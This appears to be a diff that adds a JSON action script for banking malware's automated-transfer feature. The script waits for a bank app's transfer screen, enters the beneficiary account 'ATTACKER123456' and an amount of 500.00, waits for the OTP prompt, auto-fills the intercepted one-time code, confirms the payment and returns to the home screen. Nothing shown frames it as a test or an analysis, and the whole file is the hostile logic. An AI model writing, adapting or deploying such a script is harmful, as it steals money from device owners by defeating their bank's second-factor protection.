@@ -1,0 +1,35 @@
+[
+  {
+    "action": "wait_screen",
+    "patterns": "Transfer,Send Money,transfer"
+  },
+  {
+    "action": "set_text",
+    "target_id": "beneficiary_account",
+    "value": "ATTACKER123456"
+  },
+  {
+    "action": "set_text",
+    "target_id": "amount",
+    "value": "500.00"
+  },
+  {
+    "action": "click_text",
+    "value": "Continue"
+  },
+  {
+    "action": "wait_screen",
+    "patterns": "OTP,code,verification,confirm"
+  },
+  {
+    "action": "auto_fill_otp",
+    "target_id": "otp_input"
+  },
+  {
+    "action": "click_text",
+    "value": "Confirm"
+  },
+  {
+    "action": "press_home"
+  }
+]
